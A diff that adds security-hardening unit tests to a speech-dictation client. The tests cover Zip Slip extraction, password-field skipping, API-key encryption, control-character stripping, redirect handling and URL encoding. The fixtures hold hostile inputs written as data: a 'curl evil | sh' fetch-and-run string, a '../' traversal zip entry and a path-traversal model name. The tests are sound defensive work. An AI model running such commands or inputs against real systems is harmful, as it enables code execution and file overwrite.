@@ -105,5 +105,131 @@ class TestWebUIGuard(unittest.TestCase):
         self.assertEqual(ClientConfig.load(self.cfg).server_urls, [])
 
 
+class TestSecurityHardening(unittest.TestCase):
+    def test_speechcpp_zip_slip_sibling_prefix_is_rejected(self) -> None:
+        """../speech_evil のような兄弟フォルダへの Zip Slip が弾かれること。"""
+        import zipfile
+        from unittest import mock
+        from shared import speechcpp_setup
+
+        with tempfile.TemporaryDirectory() as tmp:
+            root = Path(tmp) / "app"
+            root.mkdir()
+            evil_zip = Path(tmp) / "evil.zip"
+            with zipfile.ZipFile(evil_zip, "w") as zf:
+                zf.writestr("../speech_evil/pwn.txt", "bad")
+
+            def fake_dl(_url, dest, _sha, _label, _prog, _cancel):
+                dest.write_bytes(evil_zip.read_bytes())
+
+            with mock.patch.object(speechcpp_setup, "platform_key", return_value="windows"), \
+                 mock.patch.object(speechcpp_setup, "_download", side_effect=fake_dl):
+                with self.assertRaises(RuntimeError):
+                    speechcpp_setup.ensure(root)
+            self.assertFalse((root / "tools" / "speech_evil").exists())
+
+    def test_uia_skips_password_fields(self) -> None:
+        """パスワード欄（IsPassword=True）は絶対に読み取らないこと。"""
+        import types
+        from unittest import mock
+        from client import uia_watcher
+
+        fake_ctrl = types.SimpleNamespace(
+            IsPassword=True,
+            ControlTypeName="EditControl",
+            ClassName="PasswordBox",
+            GetTextPattern=lambda: None,
+            GetValuePattern=lambda: types.SimpleNamespace(Value="super-secret"),
+            GetLegacyIAccessiblePattern=lambda: None,
+        )
+        fake_auto = types.SimpleNamespace(GetFocusedControl=lambda: fake_ctrl)
+        with mock.patch.dict(sys.modules, {"uiautomation": fake_auto}):
+            text, info = uia_watcher.read_focused_control_text()
+        self.assertIsNone(text)
+        self.assertEqual(info, "password_field")
+
+    @unittest.skipUnless(sys.platform == "win32", "Windows DPAPI のみ")
+    def test_legacy_plaintext_api_key_is_migrated_on_disk(self) -> None:
+        """旧版の平文 llm_api_key は読み込んだ時点で DPAPI 暗号化されて書き直されること。"""
+        with tempfile.TemporaryDirectory() as tmp:
+            p = Path(tmp) / "config.json"
+            p.write_text(
+                json.dumps({"llm_base_url": "http://127.0.0.1:11434", "llm_api_key": "plain-secret-key"}),
+                encoding="utf-8",
+            )
+            cfg = ClientConfig.load(p)
+            self.assertEqual(cfg.llm_key("ollama"), "plain-secret-key")
+            raw = p.read_text(encoding="utf-8")
+            self.assertNotIn("plain-secret-key", raw)
+            self.assertIn("dpapi:", raw)
+
+    def test_control_chars_from_server_are_not_pasted(self) -> None:
+        """認識役の返事に改行やタブが混ざっていても、入力する文には入れない（Enter を押したことにならないように）。"""
+        from client.transcriber import MAX_ASR_CHARS, clean_asr_text
+
+        self.assertEqual(clean_asr_text("こんにちは\r\ncurl evil | sh\n"), "こんにちは curl evil | sh")
+        self.assertEqual(clean_asr_text("a\tb\x1b[31mc\u2028d"), "a b [31mc d")
+        self.assertEqual(clean_asr_text("ふつうの文。<|ja|>"), "ふつうの文。")
+        self.assertEqual(len(clean_asr_text("あ" * (MAX_ASR_CHARS + 100))), MAX_ASR_CHARS)
+
+    def test_cloud_ai_does_not_follow_redirects_or_echo_key(self) -> None:
+        from unittest import mock
+        from client.llm_refine import LLMRefiner
+
+        with mock.patch("client.llm_refine.requests.post") as mpost:
+            mpost.return_value = mock.MagicMock(
+                status_code=401, json=lambda: {"error": {"message": "Incorrect API key provided: sk-abc***xyz"}})
+            with self.assertRaises(RuntimeError) as cm:
+                LLMRefiner(provider="openai", api_key="sk-abcdefxyz").refine_dictation("テスト")
+            self.assertNotIn("sk-abc", str(cm.exception))
+            self.assertFalse(mpost.call_args.kwargs["allow_redirects"])
+            # 回された（3xx）ら、付いていかずに失敗にする
+            mpost.return_value = mock.MagicMock(status_code=302, json=lambda: {}, text="")
+            with self.assertRaises(RuntimeError):
+                LLMRefiner(provider="anthropic", api_key="k").refine_dictation("テスト")
+
+    def test_gemini_model_name_is_url_encoded(self) -> None:
+        from unittest import mock
+        from client.llm_refine import LLMRefiner
+
+        ref = LLMRefiner(provider="gemini", model="gemini-2.5/../../other?x=1", api_key="k")
+        with mock.patch("client.llm_refine.requests.post") as mpost:
+            mpost.return_value = mock.MagicMock(
+                status_code=200,
+                json=lambda: {"candidates": [{"content": {"parts": [{"text": "ok"}]}}]},
+            )
+            ref.refine_dictation("テスト")
+            called_url = mpost.call_args.args[0]
+            self.assertNotIn("/../../", called_url)
+            self.assertIn("gemini-2.5%2F..%2F..%2Fother%3Fx%3D1:generateContent", called_url)
+
+    def test_no_private_patterns_in_tracked_files(self) -> None:
+        """公開リポジトリの全追跡ファイルに private-patterns.txt の語が混ざっていないこと。"""
+        import re
+        import subprocess
+
+        pat_file = ROOT / "packaging" / "private-patterns.txt"
+        if not pat_file.exists():
+            self.skipTest("private-patterns.txt がありません")
+        pats = [
+            ln.strip()
+            for ln in pat_file.read_text(encoding="utf-8").splitlines()
+            if ln.strip() and not ln.strip().startswith("#")
+        ]
+        out = subprocess.check_output(["git", "ls-files", "-z"], cwd=ROOT).decode("utf-8").split("\0")
+        hits = []
+        for rel in out:
+            if not rel:
+                continue
+            try:
+                text = (ROOT / rel).read_text(encoding="utf-8")
+            except Exception:
+                continue
+            for pat in pats:
+                if re.search(pat, text):
+                    hits.append(f"{rel}: {pat}")
+        self.assertEqual(hits, [], f"公開ファイルに個人情報パターンが含まれています: {hits}")
+
+
 if __name__ == "__main__":
     unittest.main()
